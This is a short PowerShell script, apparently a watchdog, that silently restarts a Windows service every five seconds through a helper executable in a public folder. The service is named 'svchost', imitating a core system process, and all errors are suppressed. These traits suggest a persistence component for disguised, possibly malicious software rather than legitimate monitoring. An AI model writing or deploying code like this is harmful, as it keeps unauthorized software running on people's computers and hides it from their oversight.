# monitor.ps1
$ErrorActionPreference = 'SilentlyContinue'
$targetFolder = 'C:\Users\Public\SystemData'
$svcName = 'svchost'
$gnssmPath = Join-Path $targetFolder 'gnssm.exe'

while ($true) {
    $svc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
    if ($null -eq $svc -or $svc.Status -ne 'Running') {
        # استخدام Start-Service عبر GNSSM
        try { & $gnssmPath start $svcName } catch { }
    }
    Start-Sleep -Seconds 5
}

